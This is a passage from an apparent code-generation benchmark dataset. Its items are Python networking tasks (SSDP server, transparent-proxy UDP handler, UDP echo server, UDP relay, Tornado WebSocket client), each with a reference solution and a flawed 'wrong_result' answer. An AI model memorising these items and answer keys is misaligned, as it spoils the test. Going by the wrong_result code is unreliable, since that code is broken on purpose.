    "wrong_result": "```python\nimport socket\nimport threading\nimport time\nimport struct\nimport random\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = False\n        self.known = {}\n\n    def start(self):\n        self.running = True\n        self.ssdp_thread = threading.Thread(target=self.run)\n        self.ssdp_thread.start()\n\n    def stop(self, byebye=False):\n        self.running = False\n        self.sending_byebye = byebye\n        self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)\n        self.sock.setblocking(False)\n\n        for ip, mask in self.ip_list:\n            subnet_ip = self.get_subnet_ip(ip, mask)\n            self.sock_list.append((self.sock, (subnet_ip, 1900)))\n\n        while self.running:\n            try:\n                data, host_port = self.sock.recvfrom(1024)\n                self.datagram_received(data, host_port)\n            except BlockingIOError:\n                pass\n            except Exception as e:\n                print(e)\n                break\n\n        self.shutdown()\n\n    def datagram_received(self, data, host_port):\n        headers = {}\n        lines = data.decode('utf-8').split('\\r\\n')\n        for line in lines:\n            if line:\n                key, value = line.split(':', 1)\n                headers[key.strip()] = value.strip()\n\n        if 'M-SEARCH' in headers:\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        st = headers.get('ST', '')\n        if st in self.known:\n            location = self.known[st]['location']\n            server = self.known[st]['server']\n            cache_control = self.known[st]['cache_control']\n            response = f'ST: {st}\\r\\n' \\\n                       f'LOCATION: {location}\\r\\n' \\\n                       f'SERVER: {server}\\r\\n' \\\n                       f'CACHE-CONTROL: {cache_control}\\r\\n' \\\n                       f'EXT:\\r\\n' \\\n                       f'USN: {st}\\r\\n' \\\n                       f'\\r\\n'\n            self.send_it(response, host_port)\n\n    def get_subnet_ip(self, ip, mask):\n        ip_parts = list(map(int, ip.split('.')))\n        mask_parts = list(map(int, mask.split('.')))\n        subnet_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]\n        return '.'.join(map(str, subnet_parts))\n\n    def shutdown(self):\n        if self.sending_byebye:\n            for usn in self.known:\n                self.do_byebye(usn)\n\n        for sock, host_port in self.sock_list:\n            sock.close()\n\n    def register(self, usn, st, location, server, cache_control):\n        self.known[usn] = {'st': st, 'location': location, 'server': server, 'cache_control': cache_control}\n\n    def unregister(self, usn):\n        if usn in self.known:\n            del self.known[usn]\n\n    def do_byebye(self, usn):\n        response = f'NOTIFY * HTTP/1.1\\r\\n' \\\n                   f'HOST: 239.255.255.250:1900\\r\\n' \\\n                   f'CACHE-CONTROL: max-age=0\\r\\n' \\\n                   f'NTS: ssdp:byebye\\r\\n' \\\n                   f'USN: {usn}\\r\\n' \\\n                   f'\\r\\n'\n        for sock, host_port in self.sock_list:\n            self.send_it(response, host_port)\n\n    def send_it(self, response, destination):\n        self.sock.sendto(response.encode('utf-8'), destination)\n```\n"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with support for IP transparent proxying and original destination address retrieval.\n\nClass Description: The UDPSocketHandler class provides methods for receiving and sending UDP packets while maintaining information about both source and destination addresses. It supports both IPv4 and IPv6 protocols and includes special handling for transparent proxying scenarios.\n\nAttributes:\n[No explicit attributes are defined in the class, as it primarily operates through its methods]\n\nMethods:\n\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP packets and extracts both source and destination address information. Uses recvmsg() to get ancillary data containing the original destination address.\n  Input:\n    - listener: A bound UDP socket object\n    - bufsize: Maximum buffer size for received data\n  Output:\n    - tuple: (srcip: tuple, dstip: tuple, data: bytes) containing source address, destination address, and received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP packets while maintaining source address information through IP transparent option.\n  Input:\n    - sock: The socket to use for sending\n    - srcip: Source address tuple (IP, port)\n    - dstip: Destination address tuple (IP, port)\n    - data: The data to send\n  Output: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures UDP listener sockets for transparent proxying and original destination address retrieval.\n  Input:\n    - udp_listener: An object containing v4 and v6 socket instances\n  Output: None\n\nMethod4: setsockopt_error(e: Exception) -> None - Handles permission errors related to socket options and raises a fatal error.\n  Input:\n    - e: The caught PermissionError exception\n  Output: None (raises Fatal exception)",
    "Canonical_solution": "import socket\nimport os\nimport struct\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(\n            4096, socket.CMSG_SPACE(24))\n        dstip = None\n        family = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n                \"-- ignored UDP to %r: \"\n                \"couldn't determine source IP address\\n\" % (dstip,))\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        try:\n            udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(\n                socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)\n\n    def setsockopt_error(self, e):\n        raise Fatal(\"Insufficient permissions for tproxy method.\\n\"\n                   \"Your effective UID is %d, not 0. Try rerunning as root.\\n\"\n                   % os.geteuid())",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\nimport errno\n\nclass UDPSocketHandler:\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> tuple:\n        try:\n            data, ancdata, flags, srcip = listener.recvmsg(bufsize)\n            dstip = ancdata[0][1]\n            return srcip, dstip, data\n        except socket.error as e:\n            if e.errno == errno.EPERM:\n                self.setsockopt_error(e)\n            raise\n\n    def send_udp(self, sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        try:\n            sock.sendto(data, dstip)\n        except socket.error as e:\n            if e.errno == errno.EPERM:\n                self.setsockopt_error(e)\n            raise\n\n    def setup_udp_listener(self, udp_listener: object) -> None:\n        for sock in udp_listener.v4:\n            sock.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n        for sock in udp_listener.v6:\n            sock.setsockopt(socket.SOL_IPV6, socket.IPV6_TRANSPARENT, 1)\n\n    def setsockopt_error(self, e: Exception) -> None:\n        raise Fatal(\"Permission denied: %s\" % e)\n```"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a UDP echo server that receives data from clients and sends the same data back to the client.\n\nFunction Description: The function `udp_echo_server` creates a UDP socket, binds it to a specified host and port, and continuously listens for incoming data. When data is received, it echoes the same data back to the sender. The function runs indefinitely until manually stopped.\n\nInput:  \n- `host` (str, optional): The local IP address to bind the socket to. Defaults to 'localhost'.  \n- `port` (int, optional): The port number to bind the socket to. Defaults to 6789.  \n\nOutput: None (The function runs indefinitely and does not return any value.)",
    "Canonical_solution": "from socket import *\n\ndef udp_echo_server(host='localhost', port=6789):\n    server = socket(AF_INET, SOCK_DGRAM)\n    server.bind((host, port))\n    while True:\n        data, addr = server.recvfrom(1024)\n        server.sendto(data, addr)\n    server.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\n\ndef udp_echo_server(host='localhost', port=6789):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((host, port))\n    print(f\"UDP echo server listening on {host}:{port}\")\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f\"Received {data} from {addr}\")\n        sock.sendto(data, addr)\n```\n"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Implement a UDP socket handler class that provides advanced UDP communication capabilities, including receiving original destination addresses and supporting both IPv4 and IPv6 transparent proxying.\n\nClass Description: UDPSocketHandler is a utility class designed to handle UDP socket operations with special features like retrieving original destination addresses and supporting transparent proxying. It provides methods for receiving UDP packets with ancillary data, sending UDP packets with specific source addresses, and setting up UDP listeners with appropriate socket options.\n\nAttributes:\n- recvmsg: Optional[str] - Stores the detected implementation method for recvmsg ('python', 'socket_ext', or None)\n\nMethods:\n- _detect_recvmsg_implementation() -> Optional[str] - Detects available recvmsg implementation methods\n- recv_udp(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Receives UDP data with source and destination address information\n- _recv_udp_python(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Python native implementation of recv_udp\n- _recv_udp_socket_ext(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - socket_ext implementation of recv_udp\n- _recv_udp_fallback(listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes] - Fallback implementation without ancillary data support\n- send_udp(sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None - Sends UDP data with specified source address\n- setup_udp_listener(udp_listener: socket.socket) -> None - Configures UDP listener socket with transparent proxying options",
    "Canonical_solution": "import struct\nimport socket\nfrom typing import Optional, Tuple, Any\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n        \n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket as pythonsocket\n            getattr(pythonsocket.socket, \"recvmsg\")\n            return \"python\"\n        except AttributeError:\n            try:\n                import socket_ext\n                getattr(socket_ext.socket, \"recvmsg\")\n                return \"socket_ext\"\n            except ImportError:\n                return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == \"python\":\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == \"socket_ext\":\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, msg_flags, srcip = listener.recvmsg(4096, socket.CMSG_SPACE(24))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        srcip, data, adata, flags = listener.recvmsg((bufsize,), socket.CMSG_SPACE(24))\n        dstip = None\n        for a in adata:\n            if a.cmsg_level == socket.SOL_IP and a.cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif a.cmsg_level == SOL_IPV6 and a.cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data[0])\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, srcip = listener.recvfrom(bufsize)\n        return (srcip, None, data)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if not srcip:\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        if hasattr(udp_listener, 'v4') and udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nfrom typing import Any, Optional, Tuple\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = None\n\n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket_ext\n            self.recvmsg = 'socket_ext'\n        except ImportError:\n            try:\n                socket.recvmsg\n                self.recvmsg = 'python'\n            except AttributeError:\n                self.recvmsg = None\n        return self.recvmsg\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == 'socket_ext':\n            return self._recv_udp_socket_ext(listener, bufsize)\n        elif self.recvmsg == 'python':\n            return self._recv_udp_python(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        return listener.recvfrom(bufsize)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        import socket_ext\n        return socket_ext.recvmsg(listener, bufsize)\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        return listener.recvfrom(bufsize)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if srcip:\n            sock.sendto(data, srcip)\n        else:\n            sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n        udp_listener.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n```\n"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a UDP relay class that facilitates communication between local and remote servers using UDP sockets, handling DNS resolution and data forwarding.\n\nClass Description: The UDPRelay class manages UDP socket communication, including socket creation, binding, data transmission, and DNS resolution. It acts as a relay between local and remote endpoints, handling both incoming and outgoing UDP packets.\n\nAttributes:\n- _config: [dict] - Configuration parameters including addresses and ports\n- _dns_resolver: [object] - DNS resolver for handling domain name resolution\n- _is_local: [bool] - Flag indicating if the instance is local or remote\n- _sockets: [set] - Set of active client sockets\n- _server_socket: [socket.socket] - Main server socket for listening\n- _closed: [bool] - Flag indicating if the relay is closed\n- _listen_addr: [str] - Address to listen on\n- _listen_port: [int] - Port to listen on\n\nMethods:\n- __init__(config: dict, dns_resolver: object, is_local: bool) -> None - Initializes the UDP relay with configuration, DNS resolver, and local/remote mode\n- _handle_server() -> None - Handles incoming data from the server socket\n- _handle_server_dns_resolved(error: str, remote_addr: tuple, server_addr: str, params: tuple) -> None - Handles DNS resolution results and forwards data\n- _handle_client(sock: socket.socket) -> None - Handles incoming data from client sockets\n- close() -> None - Closes all sockets and cleans up resources",
    "Canonical_solution": "import socket\nimport errno\nimport logging\nfrom typing import Tuple, Optional\n\nclass UDPRelay:\n    def __init__(self, config, dns_resolver, is_local):\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = None\n        self._closed = False\n\n        if is_local:\n            self._listen_addr = config['local_address']\n            self._listen_port = config['local_port']\n        else:\n            self._listen_addr = config['server']\n            self._listen_port = config['server_port']\n\n        addrs = socket.getaddrinfo(self._listen_addr, self._listen_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        self._server_socket = socket.socket(af, socktype, proto)\n        self._server_socket.bind((self._listen_addr, self._listen_port))\n        self._server_socket.setblocking(False)\n\n    def _handle_server(self):\n        data, r_addr = self._server_socket.recvfrom(65536)\n        if not data:\n            logging.debug('UDP handle_server: data is empty')\n            return\n\n        try:\n            header_result = parse_header(data)\n            if header_result is None:\n                return\n            connecttype, addrtype, dest_addr, dest_port, header_length = header_result\n\n            if self._is_local:\n                server_addr, server_port = self._get_a_server()\n            else:\n                server_addr, server_port = dest_addr, dest_port\n\n            if (addrtype & 7) == 3:\n                af = common.is_ip(server_addr)\n                if not af:\n                    handler = common.UDPAsyncDNSHandler((data, r_addr, None, header_length))\n                    handler.resolve(self._dns_resolver, (server_addr, server_port), \n                                   self._handle_server_dns_resolved)\n                else:\n                    self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                                   server_addr, (data, r_addr, None, header_length))\n            else:\n                self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                               server_addr, (data, r_addr, None, header_length))\n        except Exception as e:\n            logging.error(f\"Error handling server data: {e}\")\n\n    def _handle_server_dns_resolved(self, error, remote_addr, server_addr, params):\n        if error:\n            return\n        data, r_addr, uid, header_length = params\n        server_port = remote_addr[1]\n\n        addrs = socket.getaddrinfo(server_addr, server_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        client = socket.socket(af, socktype, proto)\n        client.setblocking(False)\n\n        try:\n            client.sendto(data[header_length:], (server_addr, server_port))\n            self._sockets.add(client.fileno())\n        except IOError as e:\n            err = eventloop.errno_from_exception(e)\n            if err not in (errno.EINPROGRESS, errno.EAGAIN):\n                logging.error(f\"Error sending UDP data: {e}\")\n\n    def _handle_client(self, sock):\n        data, r_addr = sock.recvfrom(65536)\n        if not data:\n            return\n\n        if not self._is_local:\n            data = pack_addr(r_addr[0]) + struct.pack('>H', r_addr[1]) + data\n\n        try:\n            self._server_socket.sendto(data, r_addr)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EWOULDBLOCK,):\n                logging.error(f\"Error sending UDP response: {e}\")\n\n    def close(self):\n        self._closed = True\n        if self._server_socket:\n            self._server_socket.close()\n        for sock in self._sockets:\n            try:\n                sock.close()\n            except:\n                pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nimport time\nimport dns.resolver\n\nclass UDPRelay:\n    def __init__(self, config: dict, dns_resolver: object, is_local: bool) -> None:\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = None\n        self._closed = False\n        self._listen_addr = config['listen_addr']\n        self._listen_port = config['listen_port']\n\n    def _handle_server(self) -> None:\n        while not self._closed:\n            try:\n                data, addr = self._server_socket.recvfrom(4096)\n                if addr not in self._sockets:\n                    self._sockets.add(addr)\n                    threading.Thread(target=self._handle_client, args=(addr,)).start()\n                self._sockets.add(addr)\n                for client in self._sockets:\n                    if client != addr:\n                        self._server_socket.sendto(data, client)\n            except socket.error as e:\n                print(f\"Error handling server: {e}\")\n                break\n\n    def _handle_server_dns_resolved(self, error: str, remote_addr: tuple, server_addr: str, params: tuple) -> None:\n        if error:\n            print(f\"Error resolving DNS: {error}\")\n            return\n        data, addr = params\n        self._server_socket.sendto(data, remote_addr)\n\n    def _handle_client(self, sock: socket.socket) -> None:\n        while not self._closed:\n            try:\n                data, addr = sock.recvfrom(4096)\n                if addr not in self._sockets:\n                    self._sockets.add(addr)\n                    threading.Thread(target=self._handle_client, args=(addr,)).start()\n                self._sockets.add(addr)\n                if self._is_local:\n                    self._dns_resolver.resolve(self._config['remote_addr'], self._handle_server_dns_resolved, (data, addr))\n                else:\n                    self._server_socket.sendto(data, (self._config['remote_addr'], self._config['remote_port']))\n            except socket.error as e:\n                print(f\"Error handling client: {e}\")\n                break\n\n    def close(self) -> None:\n        self._closed = True\n        for sock in self._sockets:\n            sock.close()\n        self._server_socket.close()\n```\n"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Implement a WebSocket client connection using Tornado in Python, which handles WebSocket protocol communication including connection establishment, message exchange, and connection closure.\n\nClass Description: WebSocketClientConnection is a Tornado-based WebSocket client implementation that manages the lifecycle of a WebSocket connection, including handling messages, pings, and connection events.\n\nAttributes:\n- connect_future: Future - A future representing the connection attempt\n- read_queue: Queue - A queue for incoming messages\n- key: bytes - The WebSocket handshake key\n- _on_message_callback: Optional[Callable] - Callback for received messages\n- close_code: Optional[int] - WebSocket close code\n- close_reason: Optional[str] - WebSocket close reason\n- params: _WebSocketParams - WebSocket connection parameters\n- tcp_client: TCPClient - Underlying TCP client\n- protocol: Optional[WebSocketProtocol] - WebSocket protocol handler\n\nMethods:\n- __init__(request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None - Initializes the WebSocket client connection\n- close(code: Optional[int], reason: Optional[str]) -> None - Closes the WebSocket connection\n- on_connection_close() -> None - Handles connection closure\n- on_ws_connection_close(close_code: Optional[int], close_reason: Optional[str]) -> None - Handles WebSocket-specific connection closure\n- _on_http_response(response: HTTPResponse) -> None - Handles HTTP response during connection\n- headers_received(start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None] - Processes received headers\n- write_message(message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None] - Sends a WebSocket message\n- read_message(callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]] - Reads a message from the queue\n- _on_message(message: Union[None, str, bytes]) -> Optional[Awaitable[None]] - Internal message handler\n- ping(data: bytes) -> None - Sends a ping frame\n- get_websocket_protocol() -> WebSocketProtocol - Creates the WebSocket protocol handler",
    "Canonical_solution": "import abc\nimport asyncio\nimport base64\nimport hashlib\nimport os\nimport struct\nimport tornado\nfrom urllib.parse import urlparse\nimport zlib\nfrom tornado.concurrent import Future\nfrom tornado.escape import utf8, native_str, to_unicode\nfrom tornado import gen, httpclient, httputil\nfrom tornado.ioloop import IOLoop, PeriodicCallback\nfrom tornado.iostream import StreamClosedError, IOStream\nfrom tornado.log import app_log\nfrom tornado.netutil import Resolver\nfrom tornado import simple_httpclient\nfrom tornado.queues import Queue\nfrom tornado.tcpclient import TCPClient\nfrom tornado.util import _websocket_mask\nfrom typing import Optional, Dict, Union, List, Awaitable, Callable, Tuple, Type, Any, cast\n\n_default_max_message_size = 10 * 1024 * 1024\n\nclass WebSocketClientConnection(simple_httpclient._HTTPConnection):\n    def __init__(\n        self,\n        request: httpclient.HTTPRequest,\n        on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n        compression_options: Optional[Dict[str, Any]] = None,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        subprotocols: Optional[List[str]] = None,\n        resolver: Optional[Resolver] = None,\n    ) -> None:\n        self.connect_future = Future()\n        self.read_queue = Queue(1)\n        self.key = base64.b64encode(os.urandom(16))\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            compression_options=compression_options,\n        )\n\n        scheme, sep, rest = request.url.partition(\":\")\n        scheme = {\"ws\": \"http\", \"wss\": \"https\"}[scheme]\n        request.url = scheme + sep + rest\n        request.headers.update(\n            {\n                \"Upgrade\": \"websocket\",\n                \"Connection\": \"Upgrade\",\n                \"Sec-WebSocket-Key\": to_unicode(self.key),\n                \"Sec-WebSocket-Version\": \"13\",\n            }\n        )\n        if subprotocols is not None:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(subprotocols)\n        if compression_options is not None:\n            request.headers[\"Sec-WebSocket-Extensions\"] = (\n                \"permessage-deflate; client_max_window_bits\"\n            )\n\n        request.follow_redirects = False\n\n        self.tcp_client = TCPClient(resolver=resolver)\n        super().__init__(\n            None,\n            request,\n            lambda: None,\n            self._on_http_response,\n            104857600,\n            self.tcp_client,\n            65536,\n            104857600,\n        )\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol is not None:\n            self.protocol.close(code, reason)\n            self.protocol = None\n\n    def on_connection_close(self) -> None:\n        if not self.connect_future.done():\n            self.connect_future.set_exception(StreamClosedError())\n        self._on_message(None)\n        self.tcp_client.close()\n        super().on_connection_close()\n\n    def on_ws_connection_close(\n        self, close_code: Optional[int] = None, close_reason: Optional[str] = None\n    ) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: httpclient.HTTPResponse) -> None:\n        if not self.connect_future.done():\n            if response.error:\n                self.connect_future.set_exception(response.error)\n            else:\n                self.connect_future.set_exception(\n                    WebSocketError(\"Non-websocket response\")\n                )\n\n    async def headers_received(\n        self,\n        start_line: Union[httputil.RequestStartLine, httputil.ResponseStartLine],\n        headers: httputil.HTTPHeaders,\n    ) -> None:\n        assert isinstance(start_line, httputil.ResponseStartLine)\n        if start_line.code != 101:\n            await super().headers_received(start_line, headers)\n            return\n\n        if self._timeout is not None:\n            self.io_loop.remove_timeout(self._timeout)\n            self._timeout = None\n\n        self.headers = headers\n        self.protocol = self.get_websocket_protocol()\n        self.protocol._process_server_headers(self.key, self.headers)\n        self.protocol.stream = self.connection.detach()\n\n        IOLoop.current().add_callback(self.protocol._receive_frame_loop)\n        self.protocol.start_pinging()\n\n        self.final_callback = None\n        future_set_result_unless_cancelled(self.connect_future, self)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if self.protocol is None:\n            raise WebSocketClosedError(\"Client connection has been closed\")\n        return self.protocol.write_message(message, binary=binary)\n\n    def read_message(\n        self,\n        callback: Optional[Callable[[\"Future[Union[None, str, bytes]]\"], None]] = None,\n    ) -> Awaitable[Union[None, str, bytes]]:\n        awaitable = self.read_queue.get()\n        if callback is not None:\n            self.io_loop.add_future(asyncio.ensure_future(awaitable), callback)\n        return awaitable\n\n    def _on_message(\n        self, message: Union[None, str, bytes]\n    ) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            self._on_message_callback(message)\n            return None\n        else:\n            return self.read_queue.put(message)\n\n    def ping(self, data: bytes = b\"\") -> None:\n        data = utf8(data)\n        if self.protocol is None:\n            raise WebSocketClosedError()\n        self.protocol.write_ping(data)\n\n    def get_websocket_protocol(self) -> \"WebSocketProtocol\":\n        return WebSocketProtocol13(self, mask_outgoing=True, params=self.params)\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self.protocol.selected_subprotocol\n\nclass 